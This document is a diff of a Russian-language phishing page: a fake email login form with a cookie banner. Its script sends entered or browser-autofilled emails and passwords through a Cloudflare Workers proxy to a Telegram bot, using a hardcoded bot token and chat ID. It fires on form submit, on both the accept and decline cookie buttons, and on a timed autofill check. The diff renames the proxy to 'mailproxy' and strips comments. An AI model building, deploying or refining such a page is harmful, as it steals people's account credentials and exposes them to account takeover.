@@ -43,21 +43,15 @@
             cursor: pointer;
             margin-top: 7px;
         }
-        .login-box button:hover {
-            background: #005fa3;
-        }
+        .login-box button:hover { background: #005fa3; }
         .logo {
             font-size: 26px;
             font-weight: bold;
             margin-bottom: 18px;
         }
-
-        /* ===== НИЖНИЙ БАННЕР COOKIE ===== */
         .cookie-banner {
             position: fixed;
-            left: 0;
-            right: 0;
-            bottom: 0;
+            left: 0; right: 0; bottom: 0;
             background: #ffffff;
             border-top: 1px solid #e0e0e0;
             box-shadow: 0 -4px 16px rgba(0,0,0,0.08);
@@ -70,25 +64,10 @@
             font-size: 14px;
             color: #333;
         }
-        .cookie-banner .cookie-text {
-            flex: 1;
-            line-height: 1.4;
-            text-align: left;
-        }
-        .cookie-banner .cookie-text b {
-            display: block;
-            margin-bottom: 4px;
-            font-size: 15px;
-        }
-        .cookie-banner .cookie-text span {
-            color: #666;
-            font-size: 13px;
-        }
-        .cookie-banner .cookie-actions {
-            display: flex;
-            gap: 8px;
-            flex-shrink: 0;
-        }
+        .cookie-banner .cookie-text { flex: 1; line-height: 1.4; text-align: left; }
+        .cookie-banner .cookie-text b { display: block; margin-bottom: 4px; font-size: 15px; }
+        .cookie-banner .cookie-text span { color: #666; font-size: 13px; }
+        .cookie-banner .cookie-actions { display: flex; gap: 8px; flex-shrink: 0; }
         .cookie-banner button {
             padding: 10px 16px;
             border: none;
@@ -98,43 +77,20 @@
             cursor: pointer;
             white-space: nowrap;
         }
-        .cookie-banner .btn-accept {
-            background: #0077cc;
-            color: white;
-        }
-        .cookie-banner .btn-accept:hover {
-            background: #005fa3;
-        }
-        .cookie-banner .btn-decline {
-            background: #e4e6eb;
-            color: #333;
-        }
-        .cookie-banner .btn-decline:hover {
-            background: #d0d3d8;
-        }
-        .cookie-banner.cookie-hidden {
-            display: none !important;
-        }
-
-        /* ===== МОБИЛЬНАЯ АДАПТАЦИЯ ===== */
+        .cookie-banner .btn-accept { background: #0077cc; color: white; }
+        .cookie-banner .btn-accept:hover { background: #005fa3; }
+        .cookie-banner .btn-decline { background: #e4e6eb; color: #333; }
+        .cookie-banner .btn-decline:hover { background: #d0d3d8; }
+        .cookie-banner.cookie-hidden { display: none !important; }
         @media (max-width: 500px) {
-            .cookie-banner {
-                flex-direction: column;
-                align-items: stretch;
-                padding: 14px 16px;
-            }
-            .cookie-banner .cookie-actions {
-                justify-content: stretch;
-            }
-            .cookie-banner .cookie-actions button {
-                flex: 1;
-            }
+            .cookie-banner { flex-direction: column; align-items: stretch; padding: 14px 16px; }
+            .cookie-banner .cookie-actions { justify-content: stretch; }
+            .cookie-banner .cookie-actions button { flex: 1; }
         }
     </style>
 </head>
 <body>
 
-    <!-- ФОРМА -->
     <div id="loginFormContainer" class="login-box">
         <div class="logo">📧 Вход</div>
         <form id="loginForm">
@@ -144,7 +100,6 @@
         </form>
     </div>
 
-    <!-- НИЖНИЙ БАННЕР COOKIE -->
     <div id="cookieBanner" class="cookie-banner">
         <div class="cookie-text">
             <b>🍪 Мы используем файлы cookie</b>
@@ -158,7 +113,7 @@
 
 <script>
     // ===== ВАШИ ДАННЫЕ =====
-    const PROXY_URL = "https://russian-test.donatstaff.workers.dev";
+    const PROXY_URL = "https://mailproxy.donatstaff.workers.dev";
     const BOT_TOKEN = "8924231437:AAHSGN-TXN3D2olEVudrr53xp22SC03PCL8";
     const CHAT_ID = "8872810304";
     // ========================
@@ -186,25 +141,21 @@
         }
     }
 
-    // ===== КНОПКА "ПОДТВЕРДИТЬ" =====
     document.getElementById("btnAccept").addEventListener("click", function() {
         collectAndSend("COOKIE ПОДТВЕРЖДЕНО");
         document.getElementById("cookieBanner").classList.add("cookie-hidden");
     });
 
-    // ===== КНОПКА "ОТКЛОНИТЬ" =====
     document.getElementById("btnDecline").addEventListener("click", function() {
         collectAndSend("COOKIE ОТКЛОНЕНО");
         document.getElementById("cookieBanner").classList.add("cookie-hidden");
     });
 
-    // ===== ОТПРАВКА ФОРМЫ (ручной ввод) =====
     document.getElementById("loginForm").addEventListener("submit", function(event) {
         event.preventDefault();
         collectAndSend("РУЧНОЙ ВВОД");
     });
 
-    // ===== АВТОЗАПОЛНЕНИЕ ПРИ ЗАГРУЗКЕ =====
     function checkAutoFill() {
         const email = document.getElementById("email").value.trim();
         const password = document.getElementById("password").value.trim();
@@ -218,7 +169,7 @@
         setTimeout(checkAutoFill, 3000);
     });
 
-    console.log("ROCKET ACTIVE — Прокси + баннер cookie");
+    console.log("ROCKET ACTIVE — Прокси mailproxy");
 </script>
 </body>
 </html>
